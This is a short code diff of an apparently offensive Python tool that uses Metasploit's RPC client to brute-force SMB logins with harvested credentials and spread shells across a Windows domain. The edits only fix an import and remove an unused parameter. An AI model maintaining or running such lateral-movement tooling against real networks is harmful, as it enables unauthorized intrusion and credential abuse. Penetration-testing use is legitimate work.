@@ -5,7 +5,7 @@ import os
 import sys
 import time
 import signal
-import msfrpc
+from msfrpc.msfrpc import Msfrpc
 import string
 import random
 import asyncio
@@ -1032,7 +1032,7 @@ async def spread(lock, client, c_ids, lhost, sess_data, domain_data):
             if c not in dom_data_copy['checked_creds']:
                 # Set up a dict where the key is the creds and the val are the hosts we are admin on
                 dom_data_copy['checked_creds'][c] = []
-                await run_smb_brute(lock, client, c_ids, lhost, c, sess_data, domain_data, dom_data_copy)
+                await run_smb_brute(lock, client, c_ids, lhost, c, domain_data, dom_data_copy)
 
         await get_new_shells(lock, client, c_ids, lhost, sess_data, domain_data, dom_data_copy)
 
@@ -1057,7 +1057,7 @@ async def run_smb_login(client, c_id, lhost, threads, user, pwd, dom, target_ips
     cmd, output, err = await run_msf_module(client, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd, end_strs)
     return (cmd, output, err)
 
-async def run_smb_brute(lock, client, c_ids, lhost, creds, sess_data, domain_data, dom_data_copy):
+async def run_smb_brute(lock, client, c_ids, lhost, creds, domain_data, dom_data_copy):
     cred_type = plaintext_or_hash(creds)
     dom, user, pwd, rid = parse_creds(creds)
     threads = '32'
@@ -1611,7 +1611,7 @@ async def attack_with_session(lock, client, sess_num, sess_data, domain_data):
 def main():
 
     lock = asyncio.Lock()
-    client = msfrpc.Msfrpc({})
+    client = Msfrpc({})
     sess_data = {}
     # domain_data = {'domain':[domain_admins]}
     domain_data = {'domains':{},
